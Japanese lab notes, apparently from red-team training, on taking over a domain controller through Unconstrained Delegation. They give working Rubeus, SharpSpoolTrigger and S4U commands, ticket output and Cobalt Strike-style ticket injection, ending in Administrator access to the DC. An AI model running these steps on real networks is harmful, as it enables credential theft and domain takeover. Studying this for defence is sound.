Unconstrained Delegationが設定されているコンピュータに横展開できたとする。特権ユーザが自然に認証してくれるとは限らないため、強制認証によってTGTを窃取する。

## 強制認証手法
コンピュータでTGTをモニターする
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

SharpSpoolTriggerでDCに強制認証させる
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

成功したときの出力
```

[*] 21/02/2025 11:54:39 UTC - Found new TGT: ​ 
	User : LON-DC-1$@CONTOSO.COM 
	StartTime : 21/02/2025 10:39:21 
	EndTime : 21/02/2025 20:38:58 
	RenewTill : 28/02/2025 10:38:58 
	Flags : name_canonicalize, pre_authent, renewable, forwarded, forwardable 
	Base64EncodedTicket : ​ 
		doIFt[...snip...]5DT00=
```

このTGTではマシンアカウントのためDCへの接続に利用できない
```
LON-DC-1$ = DCのマシンアカウント

マシンアカウントは自分自身に対して
リモートでローカル管理者権限を持たない

つまり…
LON-DC-1$ として lon-dc-1 にアクセス
    ↓
「お前はただのマシンアカウントだ」
    ↓
管理者権限なし → アクセス拒否 ❌
```

### S4U2selfでマシンアカウントのTGTからTGSへ変換
#### 変換が2段階

```
第1段階：TGT → TGS （S4U2self）
    KDCに要求して正規に変換
    「AdministratorがLON-DC-1$にアクセスする」
    チケットをKDCが発行

第2段階：TGS → TGS （Service Name Substitution）
    KDCを通さずローカルで書き換え
    LON-DC-1$ 宛て → CIFS/lon-dc-1 宛て
```

Rubeus使う方法
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt[...snip...]5DT00= /nowrap
```

or krb_s4u
```
krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

### チケット悪用（なりすましトークン作成）
ファイルにチケットをかき出し。
```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\a.kirbi",[Convert]::FromBase64String("Ticket"))
```

なりすまし用のトークン作成
```
make_token CONTOSO\Administrator FakePass
```

ダンプしたチケットを利用
```
kerberos_ticket_use C:\Users\Attacker\Desktop\a.kirbi
```

DCにアクセス
```
ls \\lon-dc-1\c$
```